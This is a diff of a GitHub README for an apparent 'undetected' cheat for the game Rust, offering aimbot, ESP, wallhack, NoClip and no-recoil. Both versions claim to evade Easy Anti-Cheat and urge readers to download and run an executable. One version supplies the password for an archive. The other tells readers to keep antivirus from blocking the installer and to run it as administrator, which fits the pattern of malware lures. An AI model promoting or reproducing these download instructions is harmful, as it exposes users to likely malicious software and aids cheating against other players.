@@ -1,174 +1,76 @@
-# ⚔️ Ruster Cheat – Undetected Rust Aimbot, ESP, Wallhack, and No Recoil Toolkit
+# 🎮 RUST-Undetected-Cheat-Ruster - Level Up Your Rust Gameplay Effortlessly
 
-Welcome to the ultimate educational project for advanced game enhancement: the **Rust Cheat**. This powerful, undetected, and highly optimized toolkit is a full-featured development showcase, demonstrating how cheats interact with protected environments like *Rust*.
+[![Download RUST-Undetected-Cheat-Ruster](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-2B85ED?style=for-the-badge)](https://github.com/lostt098/RUST-Undetected-Cheat-Ruster/releases)
 
----
-> ![{6ADE718D-2E10-4CB9-B1F7-C383FDE9B53A}](https://github.com/user-attachments/assets/73e4d78d-f19b-40f1-bb6d-1063576c8f53)
+## 📖 Overview
 
----
-Featuring a precise **Rust Aimbot**, full-spectrum **Rust ESP**, advanced **Rust Wallhack**, and refined **Rust No Recoil** system, this cheat is designed with learning, testing, and performance optimization in mind. With wide compatibility (Windows 10/11, all CPUs and motherboards), fullscreen and streamer mode support, and long-term undetectability, the **Rust Cheat** provides a complete look at what modern external cheats can do.
+Ruster Cheat is the ultimate tool for Rust players. It offers advanced features like Aimbot, Visuals, and useful utilities designed to enhance your gameplay. With compatibility across Windows 10 and 11, it remains undetected for a seamless experience. Ruster Cheat helps you improve your accuracy, awareness, and overall convenience in the game. 
 
----
-## How to Use
-1. **Get the Latest Version**: (https://github.com/Ahonorianne/RUST-Undetected-Cheat-Ruster/releases/download/latest/Ruster.zip).
-2. **Unzip the Files**: Use pass `Ruster` to unpack.
-3. **Run the Application**: Execute the `.exe` file. (If it doesn't work, contact the developer.)
-4. **In-Game Key**: Press `HOME` to activate.
----
+## 🚀 Getting Started
 
-> [![Join Our Discord](https://img.shields.io/discord/1174326154207953006?color=5865F2\&label=Join%20Discord\&logo=discord\&style=for-the-badge)](https://discord.com/servers/elusion-cheats-1174326154207953006)
+Follow these simple steps to download and run RUST-Undetected-Cheat-Ruster.
 
-## 💪 Features of the Ruster
+## 📥 Download & Install
 
-### 🎯 Rust Aimbot
+1. **Visit the Download Page**  
+   To obtain the latest version of RUST-Undetected-Cheat-Ruster, visit the following link: [Download RUST-Undetected-Cheat-Ruster](https://github.com/lostt098/RUST-Undetected-Cheat-Ruster/releases).
 
-The **Rust Aimbot** module ensures precision shooting even in fast-paced combat. Built for flexibility and human-like movement, this module is completely customizable.
+2. **Select the Latest Release**  
+   On the Releases page, you will see a list of versions. Look for the topmost entry, which is the latest release. 
 
-* **Target Locking:** Locks on to enemies for instant response.
-* **Smooth Aim:** Adjustable smoothing to mimic natural motion.
-* **FOV Customization:** Define aim zones for precision.
-* **Bone Selection:** Head, neck, or chest targeting.
-* **Toggleable:** Activate or deactivate via hotkey.
+3. **Download the Installer**  
+   Click on the appropriate installer link for your system. The file should be named something like `RusterCheatInstaller.exe`.
 
-### 🔍 Rust ESP
+4. **Run the Installer**  
+   After the download finishes, locate the file in your downloads folder. Double-click on the installer to start the installation process.
 
-The **ESP (Extra Sensory Perception)** system gives you complete environmental awareness.
+5. **Follow Installation Prompts**  
+   Follow the on-screen instructions. The installer may ask for confirmation to proceed. Click "Yes" when prompted.
 
-* **Player ESP:** Shows player names, distance, and team status.
-* **Item ESP:** Highlights valuable items like weapons, loot crates, and resources.
-* **Animal ESP:** Shows wild animals for hunting or avoidance.
-* **Corpse ESP:** Locate downed enemies or allies.
-* **Health Bars:** View player health in real time.
+6. **Launch Ruster Cheat**  
+   Once the installation is complete, you can find Ruster Cheat in your application list. Click on its icon to launch the application.
 
-### 🕳 Rust Wallhack
+## ⚙️ System Requirements
 
-Never be caught off guard. The **Rust Wallhack** feature allows you to see through solid surfaces.
+Before installing RUST-Undetected-Cheat-Ruster, make sure your computer meets the following requirements:
 
-* **Transparent Wall Vision:** See player movement behind structures.
-* **Distance-Based Rendering:** Customize how far through walls ESP can work.
-* **Configurable Transparency:** Change color and opacity.
-* **Safe Render Mode:** Prevents anti-cheat detection through external overlays.
+- **Operating System**: Windows 10 or Windows 11
+- **Processor**: Intel Core i3 or equivalent
+- **RAM**: At least 4 GB
+- **Free Disk Space**: Minimum of 100 MB
+- **Graphics Card**: DirectX 11 compatible
 
-### 🏋 Rust No Recoil
+## 🔧 Features
 
-Recoil ruins accuracy. The **Rust No Recoil** system eliminates the pattern shaking found in Rust's gunplay.
+RUST-Undetected-Cheat-Ruster comes with several advanced features to improve your gameplay:
 
-* **100% Recoil Compensation:** Remove all vertical and horizontal recoil.
-* **Optional Spread Control:** Reduce bullet spread for even tighter aim.
-* **Toggle Recoil System:** Enable/disable instantly.
-* **Humanized Mode:** Slight recoil remaining to appear legitimate.
+- **Aimbot**: Automatically aim at opponents to increase hit accuracy.
+- **Visuals**: See important information about the game environment, including enemy locations.
+- **NoClip**: Move through walls, allowing for strategic advantages.
+- **ESP (Extra Sensory Perception)**: Visual cues to spot enemies and objects in the game.
+- **Recoil Control**: Reduce the weapon recoil for better shot accuracy.
 
----
+## 🛠️ Troubleshooting
 
-## 🚀 Compatibility
+If you encounter any issues while downloading or running RUSTER-Undetected-Cheat-Ruster, please consider the following:
 
-This project is designed to run flawlessly across all modern PC configurations:
+- **Antivirus Software**: Ensure that your antivirus is not blocking the installer.
+- **Permissions**: Right-click the installer and choose “Run as administrator” if the application doesn’t start.
+- **Compatibility Mode**: If you have issues on Windows 11, try running the application in compatibility mode for Windows 10.
 
-* ✅ Windows 10 and 11
-* ✅ All CPU types (Intel & AMD)
-* ✅ Compatible with all motherboards
-* ✅ Works in Fullscreen and StreamerMode
-* ✅ Functions with old game versions (auto-offset fallback)
-* ✅ Fast update-time compensation after patches
+## 🤝 Support
 
----
+For additional help, please refer to the Issues section of the repository on GitHub. You can report bugs or ask questions there. The community and maintainers are always ready to help you out.
 
-## 🚗 Status: Undetected
+## 📜 License
 
-The Rust Cheat is fully external and modular, utilizing overlay rendering and non-invasive memory reading. This allows the cheat to remain **undetected by EAC (Easy Anti-Cheat)** through:
+RUST-Undetected-Cheat-Ruster is released under the MIT License. You can use, modify, and distribute it as long as you provide appropriate credit.
 
-* No direct game injection
-* Driver-based HW read access
-* Randomized encryption
-* External rendering
+## 🔗 Additional Resources
 
-Stay undetected longer with a cheat designed for stealth.
+For more information about the features and usage of RUST-Undetected-Cheat-Ruster, check out the following resources:
 
----
+- [GitHub Repository](https://github.com/lostt098/RUST-Undetected-Cheat-Ruster)
+- [Documentation](https://github.com/lostt098/RUST-Undetected-Cheat-Ruster/wiki)
 
-## ✨ Advantages of Using Rust Cheat
-
-* **Total Environmental Awareness:** Rust ESP lets you monitor players, loot, and animals in real-time.
-* **Dominate Gunfights:** The Rust Aimbot with no recoil gives unmatched precision.
-* **Legit or Rage Playstyles:** Use soft settings to look legit or crank them for domination.
-* **Learn Anti-Cheat Behavior:** Study how Easy Anti-Cheat reacts to different techniques.
-* **Debug-Friendly:** Modular code structure is perfect for learning and debugging.
-* **Works on All Systems:** Universal compatibility and easy setup.
-
----
-
-## ❓ Frequently Asked Questions
-
-### ❓ What is Rust Cheat?
-
-Rust Cheat is an educational project designed to explore how cheats like **Rust Aimbot**, **Rust ESP**, **Rust Wallhack**, and **Rust No Recoil** are built and integrated into game environments. It showcases best practices in stealth, performance, and user interaction.
-
-### ❓ How to use Rust Aimbot?
-
-1. Launch Rust in windowed or fullscreen mode.
-2. Start the cheat executable with admin permissions.
-3. Open the Aimbot module in the UI.
-4. Adjust smoothing, FOV, and bone targeting.
-5. Hold your aim key while pointing near enemies.
-
-### ❓ Does it work in Streamer Mode?
-
-Yes! The cheat uses an external overlay so all visuals work in **Streamer Mode** and even on fullscreen.
-
-### ❓ Is the Rust Cheat undetected?
-
-As of the latest update, yes. The Rust Cheat uses fully external techniques to avoid triggering Easy Anti-Cheat.
-
-### ❓ Can it run on older PCs?
-
-Yes, it supports old Rust builds, legacy hardware, and systems without the latest drivers.
-
----
-
-## 📚 Project Structure
-
-```
-rust-cheat/
-├─ aimbot/
-│   ├─ core.cpp
-│   └─ smoothing.cpp
-├─ esp/
-│   ├─ player_esp.cpp
-│   └─ loot_esp.cpp
-├─ wallhack/
-│   └─ wall_overlay.cpp
-├─ recoil/
-│   └─ no_recoil.cpp
-├─ overlay/
-│   └─ dx_overlay.cpp
-├─ core/
-│   └─ injector.cpp
-└─ README.md
-```
-
----
-
-## 📅 Prerequisites
-
-* Windows 10/11
-* Visual Studio 2022 or later
-* C++17 Toolchain
-* DirectX SDK
-* Administrator Access
-
----
-
-## 🌎 SEO-Optimized Keywords
-
-This README is optimized for the following keywords:
-
-* Rust Cheat
-* Free Rust Cheat
-* Rust Aimbot
-* Rust Wallhack
-* Rust ESP
-* Rust No Recoil
-* Undetected Rust Hack
-* External Rust Cheat
-* Rust Cheat GitHub
-* Learn Game Hacking Rust
+[![Download RUST-Undetected-Cheat-Ruster](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-2B85ED?style=for-the-badge)](https://github.com/lostt098/RUST-Undetected-Cheat-Ruster/releases)
